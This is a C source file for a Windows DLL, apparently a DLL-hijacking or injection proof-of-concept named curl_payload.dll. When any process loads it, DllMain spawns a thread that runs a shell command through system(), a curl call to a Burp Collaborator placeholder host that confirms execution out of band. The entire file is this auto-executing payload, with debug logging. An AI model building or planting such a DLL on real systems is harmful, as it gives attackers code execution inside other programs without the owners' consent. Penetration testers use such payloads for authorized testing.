#include <windows.h>
#include <stdlib.h> // For system() if you were to use it, not needed for CreateThread
#include <stdio.h>  // For wvsprintfW or _vsnwprintf_s

// Helper to output to DebugView
VOID OutputDebugStringFormat( LPCWSTR format, ... ) {
   WCHAR buf[1024];
   va_list args;
   va_start( args, format );
   #ifdef _MSC_VER
     _vsnwprintf_s(buf, sizeof(buf)/sizeof(WCHAR), _TRUNCATE, format, args);
   #else
     wvsprintfW( buf, format, args );
   #endif
   va_end( args );
   OutputDebugStringW( buf );
}

DWORD WINAPI NetworkEntryThread(LPVOID lpParameter) {
    (void)lpParameter; // Unused
    OutputDebugStringW(L"[curl_payload.dll] NetworkEntryThread started.\n");
    // IMPORTANT: Replace with your actual Burp Collaborator URL
    int result = system("curl http://YOUR_UNIQUE_ID.oastify.com"); 
    OutputDebugStringFormat(L"[curl_payload.dll] system(curl...) returned: %d\n", result);
    OutputDebugStringW(L"[curl_payload.dll] NetworkEntryThread finished.\n");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;

    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        { // <<-- ADDED OPENING BRACE for new scope
            OutputDebugStringW(L"[curl_payload.dll] DLL_PROCESS_ATTACH: Creating NetworkEntryThread.\n");
            HANDLE hThread = CreateThread(NULL, 0, NetworkEntryThread, NULL, 0, NULL);
            if (hThread) {
                OutputDebugStringW(L"[curl_payload.dll] NetworkEntryThread created successfully.\n");
                CloseHandle(hThread); // Close the handle to the thread object, thread continues running
            } else {
                DWORD dwError = GetLastError();
                OutputDebugStringFormat(L"[curl_payload.dll] Failed to create NetworkEntryThread. Error: %d (0x%X)\n", dwError, dwError);
            }
            // break; // The break is still needed if you don't want fall-through (though DllMain usually handles one reason per call)
        } // <<-- ADDED CLOSING BRACE
        break; // Break moved outside the new scope

        case DLL_THREAD_ATTACH:
            // OutputDebugStringW(L"[curl_payload.dll] DLL_THREAD_ATTACH.\n");
            break;
        case DLL_THREAD_DETACH:
            // OutputDebugStringW(L"[curl_payload.dll] DLL_THREAD_DETACH.\n");
            break;
        case DLL_PROCESS_DETACH:
            OutputDebugStringW(L"[curl_payload.dll] DLL_PROCESS_DETACH.\n");
            break;
    }
    // OutputDebugStringW(L"[curl_payload.dll] DllMain returning TRUE.\n"); // Moved for clarity, only if not already returned
    return TRUE;
}